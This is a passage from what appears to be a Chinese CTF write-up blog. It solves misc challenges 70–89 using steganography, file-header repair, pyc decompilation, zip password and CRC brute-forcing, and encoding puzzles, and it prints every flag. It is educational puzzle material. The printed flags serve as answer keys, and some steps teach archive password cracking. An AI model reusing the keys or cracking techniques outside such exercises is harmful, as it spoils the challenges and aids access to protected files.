003853](.&#x2F;Misc-Record&#x2F;2024-11-22 003853.png)</p><p>可以发现红框框起来的数字不同的是不同的对flag的尝试</p><p>hacker使用二分法爆破出flag内容，在对一个字符进行bool判断时，被重复判断的ASCII值就是正确的字符。</p><p>如上图是55和125</p><p>这里我们需要找到ascii开始判断flag的部分来提取，或者可以从下往上提取</p><p>最后提取如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">102, 108, 97, 103, 123, 52, 55, 101, 100, 98, 56, 51, 48, 48, 101, 100, 53, 102, 57, 98, 50, 56, 102, 99, 53, 52, 98, 48, 100, 48, 57, 101, 99, 100, 101, 102, 55, 125</span><br></pre></td></tr></table></figure><p>ascii码解密得到flag：flag{47edb8300ed5f9b28fc54b0d09ecdef7}</p><h3 id="70-john-in-the-middle"><a href="#70-john-in-the-middle" class="headerlink" title="70.john-in-the-middle"></a>70.john-in-the-middle</h3><p>拿到pcanp文件可以先拖到随波逐流，binwalk一下没有提取出什么东西</p><p>formost一下发现提取出了几张图片，逐个对图片进行分析。</p><p>发现有个三角形状的图片在stegsolve可以看到flag</p><img src="2024-11-22 100005.png" alt="2024-11-22 100005" style="zoom:50%;"><p>flag：flag{J0hn_th3_Sn1ff3r}</p><h3 id="71-UTCTF2020-docx"><a href="#71-UTCTF2020-docx" class="headerlink" title="71.[UTCTF2020]docx"></a>71.[UTCTF2020]docx</h3><p>word本质是zip，改后缀名，在word&#x2F;media目录里找到image23.png</p><p>里面有flag</p><img src="2024-11-22 100523.png" alt="2024-11-22 100523" style="zoom:50%;"><p>flag：flag{unz1p_3v3ryth1ng}</p><h3 id="72-ACTF新生赛2020-swp"><a href="#72-ACTF新生赛2020-swp" class="headerlink" title="72.[ACTF新生赛2020]swp"></a>72.[ACTF新生赛2020]swp</h3><p>拿到zip先解压，拿到pcapng可以先尝试formost提取一下</p><p>提取出一堆图片，gif和一个zip</p><p>zip解压过后得到一个flag.swp</p><p>可以用010打开，发现</p><img src="2024-11-22 101400.png" alt="2024-11-22 101400" style="zoom:80%;"><p>得到ctf{c5558bcf-26da-4f8b-b181-b61f3850b9e5}</p><p>flag：flag{c5558bcf-26da-4f8b-b181-b61f3850b9e5}</p><h3 id="73-GXYCTF2019-SXMgdGhpcyBiYXNlPw"><a href="#73-GXYCTF2019-SXMgdGhpcyBiYXNlPw" class="headerlink" title="73.[GXYCTF2019]SXMgdGhpcyBiYXNlPw&#x3D;&#x3D;"></a>73.[GXYCTF2019]SXMgdGhpcyBiYXNlPw&#x3D;&#x3D;</h3><p>题目解码为Is this base?</p><p>解压zip得到一个txt，里面是多行base64，解密</p><p>解密后得到一首法语诗词，，</p><p>可以在随波逐流里选择 base64隐写解密，得到GXY{fazhazhenhaoting}</p><p>flag：flag{fazhazhenhaoting}</p><h3 id="74-间谍启示录"><a href="#74-间谍启示录" class="headerlink" title="74.间谍启示录"></a>74.间谍启示录</h3><p>得到iso映像文件，foremost提取一下</p><p>发现得到了个exe和一个压缩包</p><p>exe运行得到文件已被销毁.exe</p><p>压缩包解压得到文件已被销毁.exe和文件已被销毁.ico和flag.exe</p><p>运行flag.exe，就能看到机密文件.txt（记得要在显示里面把隐藏内容勾选上）</p><img src="2024-11-22 105006.png" alt="2024-11-22 105006" style="zoom:75%;"><p>flag：flag{379:7b758:g7dfe7f19:9464f:4g9231}</p><h3 id="75-喵喵喵"><a href="#75-喵喵喵" class="headerlink" title="75.喵喵喵"></a>75.喵喵喵</h3><p>得到一张小猫图片，在stegsolve里面发现在RGB三色的0通道有异常，猜测是lsb隐写</p><p>顺序是BGR时得到</p><img src="2024-11-22 105723.png" alt="2024-11-22 105723" style="zoom:50%;"><p>是一张png，保存下来，却发现打不开</p><p>010查看发现文件头有问题，我们修改一下</p><p>查看后发现是半张二维码</p><img src="2024-11-22 110400.png" alt="2024-11-22 110400" style="zoom:80%;"><p>二维码拖进随波逐流爆破宽高得到整张二维码</p><p>扫了之后发现给了一个网盘地址</p><img src="2024-11-22 110637.png" alt="2024-11-22 110637" style="zoom:50%;"><p>网盘<a href="https://pan.baidu.com/s/1pLT2J4f">https://pan.baidu.com/s/1pLT2J4f</a></p><p>得到一个txt文件，写着：flag不在这里哦  你猜猜flag在哪里呢？  找找看吧</p><p>猜测为ntfs，扫描，提取</p><img src="2024-11-22 112003.png" alt="2024-11-22 112003" style="zoom:75%;"><p>得到一个pyc</p><blockquote><p>[!NOTE]</p><p><code>.pyc</code> 是 Python 编译后的字节码文件，通常是在运行 Python 脚本时由解释器自动生成，用于加速程序运行</p><p>想查看 <code>.pyc</code> 文件的源码，可以使用反编译工具 uncompyle6 将其还原为 <code>.py</code> 文件。</p></blockquote><p>使用uncompyle6进行反编译。或者使用在线网站 <a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p><p>这个我使用在线网站，因为不知道为什么我的uncompyle6反编译出来的有点问题，也许是反编译的版本是3.12.7和2.7不同的问题。。</p><p>得到如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>():</span><br><span class="line">    flag = <span class="string">&quot;*************&quot;</span></span><br><span class="line">    ciphertext = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        s = <span class="built_in">chr</span>(i ^ <span class="built_in">ord</span>(flag[i]))</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s = <span class="built_in">ord</span>(s) + <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = <span class="built_in">ord</span>(s) - <span class="number">10</span></span><br><span class="line">        ciphertext.append(<span class="built_in">str</span>(s))</span><br><span class="line">    <span class="keyword">return</span> ciphertext[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ciphertext = [</span><br><span class="line">    <span class="string">&quot;96&quot;</span>,</span><br><span class="line">    <span class="string">&quot;65&quot;</span>,</span><br><span class="line">    <span class="string">&quot;93&quot;</span>,</span><br><span class="line">    <span class="string">&quot;123&quot;</span>,</span><br><span class="line">    <span class="string">&quot;91&quot;</span>,</span><br><span class="line">    <span class="string">&quot;97&quot;</span>,</span><br><span class="line">    <span class="string">&quot;22&quot;</span>,</span><br><span class="line">    <span class="string">&quot;93&quot;</span>,</span><br><span class="line">    <span class="string">&quot;70&quot;</span>,</span><br><span class="line">    <span class="string">&quot;102&quot;</span>,</span><br><span class="line">    <span class="string">&quot;94&quot;</span>,</span><br><span class="line">    <span class="string">&quot;132&quot;</span>,</span><br><span class="line">    <span class="string">&quot;46&quot;</span>,</span><br><span class="line">    <span class="string">&quot;112&quot;</span>,</span><br><span class="line">    <span class="string">&quot;64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;97&quot;</span>,</span><br><span class="line">    <span class="string">&quot;88&quot;</span>,</span><br><span class="line">    <span class="string">&quot;80&quot;</span>,</span><br><span class="line">    <span class="string">&quot;82&quot;</span>,</span><br><span class="line">    <span class="string">&quot;137&quot;</span>,</span><br><span class="line">    <span class="string">&quot;90&quot;</span>,</span><br><span class="line">    <span class="string">&quot;109&quot;</span>,</span><br><span class="line">    <span class="string">&quot;99&quot;</span>,</span><br><span class="line">    <span class="string">&quot;112&quot;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>这里看到对flag进行了加密，我们解密一下，解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    <span class="comment"># 将密文恢复到加密前的顺序</span></span><br><span class="line">    ciphertext = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, ciphertext[::-<span class="number">1</span>]))</span><br><span class="line">    flag = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i, s <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphertext):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s -= <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s += <span class="number">10</span></span><br><span class="line">        <span class="comment"># 进行异或操作还原原始字符</span></span><br><span class="line">        flag.append(<span class="built_in">chr</span>(s ^ i))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ciphertext = [</span><br><span class="line">    <span class="string">&quot;96&quot;</span>,</span><br><span class="line">    <span class="string">&quot;65&quot;</span>,</span><br><span class="line">    <span class="string">&quot;93&quot;</span>,</span><br><span class="line">    <span class="string">&quot;123&quot;</span>,</span><br><span class="line">    <span class="string">&quot;91&quot;</span>,</span><br><span class="line">    <span class="string">&quot;97&quot;</span>,</span><br><span class="line">    <span class="string">&quot;22&quot;</span>,</span><br><span class="line">    <span class="string">&quot;93&quot;</span>,</span><br><span class="line">    <span class="string">&quot;70&quot;</span>,</span><br><span class="line">    <span class="string">&quot;102&quot;</span>,</span><br><span class="line">    <span class="string">&quot;94&quot;</span>,</span><br><span class="line">    <span class="string">&quot;132&quot;</span>,</span><br><span class="line">    <span class="string">&quot;46&quot;</span>,</span><br><span class="line">    <span class="string">&quot;112&quot;</span>,</span><br><span class="line">    <span class="string">&quot;64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;97&quot;</span>,</span><br><span class="line">    <span class="string">&quot;88&quot;</span>,</span><br><span class="line">    <span class="string">&quot;80&quot;</span>,</span><br><span class="line">    <span class="string">&quot;82&quot;</span>,</span><br><span class="line">    <span class="string">&quot;137&quot;</span>,</span><br><span class="line">    <span class="string">&quot;90&quot;</span>,</span><br><span class="line">    <span class="string">&quot;109&quot;</span>,</span><br><span class="line">    <span class="string">&quot;99&quot;</span>,</span><br><span class="line">    <span class="string">&quot;112&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码密文</span></span><br><span class="line">flag = decode(ciphertext)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decoded flag:&quot;</span>, flag)</span><br></pre></td></tr></table></figure><p>解密出flag：flag{Y@e_Cl3veR_C1Ever!}</p><h3 id="76-小易的u盘"><a href="#76-小易的u盘" class="headerlink" title="76.小易的u盘"></a>76.小易的u盘</h3><p>拿到iso我们可以foremost提取一下或者解压一下</p><p>拿到一大推文件，先看inf</p><p>inf里面是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[AutoRun]</span><br><span class="line">Open=autoflag - 副本 (32)</span><br></pre></td></tr></table></figure><blockquote><p>[!NOTE]</p><p>inf文件中包含硬件设备的信息或脚本以控制硬件操作，inf是微软为硬件设备制造商发布其驱动程序推出的一种文件格式。inf文件中包含了硬件驱动安装的信息，比如、安装到哪一个文件夹中、怎样在注册表中加入自身相关信息、源文件在哪里等</p><p>autorun.inf 里面 Open的含义<br>含义：指定设备启用时运行之命令行。<br>格式：Open&#x3D;命令行（命令行：程序路径名 [参数])<br>参数：<br>命令行：自动运行的命令行，必须是 .exe、.com、.bat 文件，其他格式文件可以使用start.exe打开或使用ShellExecute命令。</p></blockquote><p>说明它自动运行autoflag-副本（32）</p><p>我们尝试运行的时候会报错，使用ida反编译试试</p><p>发现flag</p><img src="2024-11-22 132448.png" alt="2024-11-22 132448" style="zoom:50%;"><p>flag：flag{29a0vkrlek3eu10ue89yug9y4r0wdu10}</p><h3 id="77-WUSTCTF2020-爬"><a href="#77-WUSTCTF2020-爬" class="headerlink" title="77.[WUSTCTF2020]爬"></a>77.[WUSTCTF2020]爬</h3><p>附件没有后缀，010打开发现是pdf文件，改后缀后打开</p><img src="2024-11-22 132940.png" alt="2024-11-22 132940" style="zoom:50%;"><p>提示我们flag被图片盖住了，使用在线编辑pdf网站： <a href="https://smallpdf.com/">https://smallpdf.com/</a></p><p>移开图片看到：</p><img src="2024-11-22 133720.png" alt="2024-11-22 133720" style="zoom:80%;"><p>Hex解密得：wctf2020{th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p}</p><p>flag：flag{th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p}</p><h3 id="78-RoarCTF2019-黄金6年"><a href="#78-RoarCTF2019-黄金6年" class="headerlink" title="78.[RoarCTF2019]黄金6年"></a>78.[RoarCTF2019]黄金6年</h3><p>下载是一个MP4文件，010打开发现结尾有</p><img src="2024-11-22 143615.png" alt="2024-11-22 143615" style="zoom:80%;"><p>是base64，解码发现有rar字样，猜测为压缩包，使用cyberchef</p><img src="2024-11-22 144433.png" alt="2024-11-22 144433" style="zoom:80%;"><p>先base64解码再hex加密就能得到rar的十六进制，使用010保存下来，得到rar，解压需要密码</p><p>使用potplayer逐帧查看视频，发现几个二维码</p><img src="2024-11-22 144854.png" alt="2024-11-22 144854" style="zoom:50%;"><img src="2024-11-22 144921.png" alt="2024-11-22 144921" style="zoom:50%;"><img src="2024-11-22 144945.png" alt="2024-11-22 144945" style="zoom:50%;"><img src="2024-11-22 145029.png" alt="2024-11-22 145029" style="zoom:50%;"><p>（服了，考察眼力。。</p><p>解码之后分别是 key1:i key2:want key3:play key4:ctf</p><p>连起来就是压缩包密码，iwantplayctf，得到roarctf{CTF-from-RuMen-to-RuYuan}</p><p>flag：flag{CTF-from-RuMen-to-RuYuan}</p><h3 id="79-WUSTCTF2020-alison-likes-jojo"><a href="#79-WUSTCTF2020-alison-likes-jojo" class="headerlink" title="79.[WUSTCTF2020]alison_likes_jojo"></a>79.[WUSTCTF2020]alison_likes_jojo</h3><p>得到两张图片。boki.jpg和jljy.jpg</p><p>先处理boki，发现有隐写，binwalk提取一下</p><p>得到一个zip，有密码，爆破得到密码是888866，解压得到</p><p>WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09</p><p>经过三次base64解码得到killerqueen</p><p>再处理jljy.jpg，最后发现是outguess隐写</p><img src="2024-11-22 153049.png" alt="2024-11-22 153049" style="zoom:80%;"><p>成功提取，得到 wctf2020{pretty_girl_alison_likes_jojo}</p><p>flag：flag{pretty_girl_alison_likes_jojo}</p><h3 id="80-安洵杯-2019-吹着贝斯扫二维码"><a href="#80-安洵杯-2019-吹着贝斯扫二维码" class="headerlink" title="80.[安洵杯 2019]吹着贝斯扫二维码"></a>80.[安洵杯 2019]吹着贝斯扫二维码</h3><p>得到一个flag.zip和一堆东西，zip用winrar打开发现有注释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GNATOMJVIQZUKNJXGRCTGNRTGI3EMNZTGNBTKRJWGI2UIMRRGNBDEQZWGI3DKMSFGNCDMRJTII3TMNBQGM4TERRTGEZTOMRXGQYDGOBWGI2DCNBY</span><br></pre></td></tr></table></figure><p>这个先解不出来，尝试别的</p><p>010随便打开一个文件可以发现是jpg文件，后缀改为jpg后就可以打开</p><p>这里可以cmd打开后 <code>ren * *.jpg</code> 批量改后缀（网上学的</p><img src="2024-11-22 154637.png" alt="2024-11-22 154637" style="zoom:50%;"><p>发现这里应该是二维码拼接，而且010随便拖进去一个jpg发现在最后有神秘数字</p><p>猜测为拼接顺序，根据数字重命名文件</p><p>初见端倪：</p><img src="2024-11-22 155844.png" alt="2024-11-22 155844" style="zoom:33%;"><p>试着扫了一下，果然扫不出来，要用ps拼接，，或者使用PPT拼接，我这里使用ppt</p><p>拼接完如下：</p><p>（累死lz了。。）</p><img src="2024-11-22 163820.png" alt="2024-11-22 163820" style="zoom:50%;"><p>扫码，扫出来得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASE Family Bucket ??? </span><br><span class="line">85-&gt;64-&gt;85-&gt;13-&gt;16-&gt;32</span><br></pre></td></tr></table></figure><p>回想注释里得到的神秘数字，我们利用base家族反向解密，其中13指的是rot13</p><p>得到：ThisIsSecret!233 为解压缩密码</p><p>解压zip，得到flag{Qr_Is_MeAn1nGfuL}</p><p>flag：flag{Qr_Is_MeAn1nGfuL}</p><h3 id="81-从娃娃抓起"><a href="#81-从娃娃抓起" class="headerlink" title="81.从娃娃抓起"></a>81.从娃娃抓起</h3><p>全文：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">题目描述：伟人的一句话，标志着一个时代的开始。那句熟悉的话，改变了许多人的一生，为中国三十年来计算机产业发展铺垫了道路。两种不同的汉字编码分别代表了汉字信息化道路上的两座伟大里程碑。请将你得到的话转为md5提交，md5统一为32位小写。</span><br><span class="line"></span><br><span class="line">0086 1562 2535 5174</span><br><span class="line">bnhn s wwy vffg vffg rrhy fhnv</span><br><span class="line">请将你得到的这句话转为md5提交，md5统一为32位小写。</span><br><span class="line">提交格式：flag&#123;md5&#125;</span><br></pre></td></tr></table></figure><p>两行加密的，提醒我们都是汉字编码，随波逐流解密试试</p><p>第一行经过中文电报解码得到：</p><p>人工智能</p><p>第二行经过五笔字型解码，得到：</p><p>也要从娃娃抓起</p><p>解密网址： <a href="http://life.chacuo.net/convertwubi">http://life.chacuo.net/convertwubi</a>（这个是五笔输入的网址，需要你一个个打出来）</p><p>总的：人工智能也要从娃娃抓起</p><p>包上md5得到：3b4b5dccd2c008fe7e2664bd1bc19292</p><p>flag：flag{3b4b5dccd2c008fe7e2664bd1bc19292}</p><h3 id="82-弱口令"><a href="#82-弱口令" class="headerlink" title="82.弱口令"></a>82.弱口令</h3><p>ZIP是加密的，看备注里面是一堆空白</p><img src="2024-11-23 004857.png" alt="2024-11-23 004857" style="zoom:50%;"><p>出不来，查了一下发现要用sunblime，打开发现</p><img src="2024-11-23 005911.png" alt="2024-11-23 005911" style="zoom:50%;"><p>貌似是莫斯密码，手敲得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.... . .-.. .-.. ----- ..-. --- .-. ..- --</span><br></pre></td></tr></table></figure><p>解码得到：HELL0FORUM</p><p>解压zip，得到女神.png</p><p>看了wp才知道有个cloacked-pixel隐写</p><p>装好cloacked-pixel后kali解密得到flag</p><img src="2024-11-25 000842.png" alt="2024-11-25 000842" style="zoom:75%;"><p>得到flag：flag{jsy09-wytg5-wius8}</p><h3 id="83-Mysterious"><a href="#83-Mysterious" class="headerlink" title="83.Mysterious"></a>83.Mysterious</h3><p>得到一个exe，一看就是反编译题目，使用ida打开</p><p>先f5看函数，步入winmain，再步入dialogfunc，之后步入sub_401090</p><p>看到flag</p><img src="2024-11-26 115110.png" alt="2024-11-26 115110" style="zoom:75%;"><p>flag：flag{123_Buff3r_0v3rf|0w}</p><h3 id="84-GUET-CTF2019-zips"><a href="#84-GUET-CTF2019-zips" class="headerlink" title="84.[GUET-CTF2019]zips"></a>84.[GUET-CTF2019]zips</h3><p>得到zip解压得到222.zip</p><p>爆破得到密码723456</p><p>然后得到一个111.zip</p><p>111.zip可以发现是伪加密，破解后得到flag.zip和一个sh</p><p>setup.sh里面的内容是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">#</span><br><span class="line">zip -e --password=`python -c &quot;print(__import__(&#x27;time&#x27;).time())&quot;` flag.zip flag</span><br></pre></td></tr></table></figure><p>发现zip是将时间戳当作密码</p><p>于是我们使用掩码爆破</p><p>发现flag.zip创建时间2019-05-17 08:25:28</p><p>先用py跑出临近一个小时的时间戳</p><img src="2024-11-26 115916.png" alt="2024-11-26 115916" style="zoom:50%;"><p>得到时间戳区间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1558051200.0</span><br><span class="line">1558054800.0</span><br></pre></td></tr></table></figure><p>而且因为小数点后不确定，可以从第一位进行尝试</p><p>接下来使用arp进行掩码爆破</p><img src="2024-11-26 142641.png" alt="2024-11-26 142641" style="zoom:50%;"><p>爆破出密码1558080832.15</p><p>解压得到flag：flag{fkjabPqnLawhvuikfhgzyffj}</p><h3 id="85-UTCTF2020-file-header"><a href="#85-UTCTF2020-file-header" class="headerlink" title="85.[UTCTF2020]file header"></a>85.[UTCTF2020]file header</h3><p>顾名思义是考文件头的，我们打开后是一张图片，发现打不开，于是拖进010发现少了png的文件头，补上。</p><p>然后就能拿到flag：flag{3lit3_h4ck3r}</p><h3 id="86-zip"><a href="#86-zip" class="headerlink" title="86.zip"></a>86.zip</h3><p>拿到了很多的zip，但是每个zip文件内容都很短，意思是要我们爆破crc</p><p>网上找了个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">string=string.printable</span><br><span class="line">crc_s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">68</span>):</span><br><span class="line">    zip_name= <span class="string">&quot;out&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span>    <span class="comment">#读每个文件</span></span><br><span class="line">    zip_crc=zipfile.ZipFile(zip_name,<span class="string">&#x27;r&#x27;</span>).getinfo(<span class="string">&#x27;data.txt&#x27;</span>).CRC</span><br><span class="line">    <span class="comment">#读crc</span></span><br><span class="line">    <span class="built_in">print</span>(zip_crc)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> string:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> string:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> string:</span><br><span class="line">                    s=a+b+c+d</span><br><span class="line">                    <span class="comment">#进行爆破</span></span><br><span class="line">                    <span class="keyword">if</span> zip_crc == (binascii.crc32(s.encode())):</span><br><span class="line">                        <span class="built_in">print</span>(s)</span><br><span class="line">                        crc_s+=s</span><br><span class="line"><span class="built_in">print</span>(crc_s)</span><br></pre></td></tr></table></figure><p>最后爆破出来得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==</span><br></pre></td></tr></table></figure><p>cyberchef一下得到</p><img src="2025-01-11 213027.png" alt="2025-01-11 213027" style="zoom:80%;"><p>发现是一个文件，down下来010看到</p><img src="2025-01-11 213314.png" alt="2025-01-11 213314" style="zoom:80%;"><p>猜测是缺少rar文件头，补上。</p><p>然后就能在注释里发现flag</p><img src="2025-01-11 213447.png" alt="2025-01-11 213447" style="zoom:80%;"><p>flag：flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}</p><h3 id="87-XMAN2018排位赛-通行证"><a href="#87-XMAN2018排位赛-通行证" class="headerlink" title="87.[XMAN2018排位赛]通行证"></a>87.[XMAN2018排位赛]通行证</h3><p>拿到一串<code>a2FuYmJyZ2doamx7emJfX19ffXZ0bGFsbg==</code></p><p>base64解密之后是<code>kanbbrgghjl&#123;zb____&#125;vtlaln</code></p><p>然后最神奇的地方来了，我猜到这里要继续解密，但迟迟不出</p><p>最后看了wp发现应该用W型栅栏<strong>加密</strong>（注意是加密而不是解密）</p><p>然后得到<code>kzna&#123;blnl_abj_lbh_trg_vg&#125;</code></p><p>一眼凯撒，解密得到 xman{oyay_now_you_get_it}</p><p>flag：flag{oyay_now_you_get_it}</p><h3 id="88-WUSTCTF2020-girlfriend"><a href="#88-WUSTCTF2020-girlfriend" class="headerlink" title="88.[WUSTCTF2020]girlfriend"></a>88.[WUSTCTF2020]girlfriend</h3><p>主要得到一个zip，解压出来是一段wav</p><p>一下就能听出来时拨号音识别</p><p>随波逐流一下</p><img src="2025-01-15 193154.png" alt="2025-01-15 193154" style="zoom:50%;"><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">999*666*88*2*777*33*6*999*4*4444*777*555*333*777*444*33*66*3*7777</span><br></pre></td></tr></table></figure><p>手机上九宫格按一下，次数对应长按的第几个，然后就能得到flag（记得要换小写）</p><p>flag：flag{youaremygirlfriends}</p><h3 id="89-DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#89-DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="89.[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>89.[DDCTF2018](╯°□°）╯︵ ┻━┻</h3><p>全文如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(╯°□°）╯︵ ┻━┻</span><br><span class="line">50pt</span><br><span class="line"></span><br><span class="line">(╯°□°）╯︵ ┻━┻</span><br><span class="line"></span><br><span class="line">d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</span><br></pre></td></tr></table></figure><p>这串东西16进制转换得到（注意要切片，2个2个一组）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">212 232 225 244 160 247 225 243 160 230 225 243 244 161 160 212 232 229 160 230 236 225 231 160 233 243 186 160 196 196 195 212 198 251 185 178 178 225 226 185 185 183 180 225 180 183 227 228 179 178 178 227 230 180 179 226 181 176 182 177 176 230 225 229 225 181 253</span><br></pre></td></tr></table></figure><p>发现数字好大，但是这一组组的数字联想到ascii，试着全减去128，得到（这里的偏移也可以脚本试出来应该）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 